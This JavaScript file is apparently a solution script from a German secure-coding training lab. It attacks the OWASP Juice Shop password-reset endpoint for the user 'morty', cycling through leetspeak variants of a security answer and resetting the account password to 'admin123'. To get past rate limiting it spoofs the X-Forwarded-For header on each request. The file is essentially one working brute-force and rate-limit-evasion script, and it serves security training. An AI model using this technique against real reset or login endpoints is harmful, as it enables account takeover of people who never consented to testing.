// Einfügen erlauben

var host = 'https://f1fe71a1.labs.secure-coding-schulung.de';

var passwordList = [
    "snuffles",
    "snowball",
    "5n0wb4ll",
    "5n0w8all",
    "5N0W8411",
    "5n0w8411",
    /* ... */
    "5n0wb4ll",
    "5n0wb4ll",
    "5n0wb4ll",
    "5n0wb4ll",
    "5n0wb4ll",
    "5N0wb41L" ];

console.log("Bruteforce attack started");
var passwordFound = false;
for (var i = 0; i < passwordList.length; i++) {

    var bruteforcePassword = passwordList[i];
    var postBody = {    "answer" : bruteforcePassword,
                        "email" :  "morty@juice-sh.op",
                        "new" :	   "admin123",
                        "repeat" : "admin123"
                   };

    $.ajax({
        url: host + '/rest/user/reset-password',
        type: 'post',
        dataType: 'json',
        contentType: 'application/json',
        data: JSON.stringify(postBody),
        beforeSend: function(jqXHR, settings) {
            jqXHR.setRequestHeader('X-Forwarded-For', '192.'+i+'.99.100');
        },
        headers: {
            "X-Forwarded-For": '192.'+i+'.99.100'
        },
        success: function (data) {
            console.warn("Password found!", bruteforcePassword);
            console.info(data);
            passwordFound = true;
            window.alert(bruteforcePassword);
        },
        error: function (data) {
            console.info("Wrong password", data);
            //TODO: implement random sleep
        },
    });

    if (passwordFound) {
      break;
    }
}
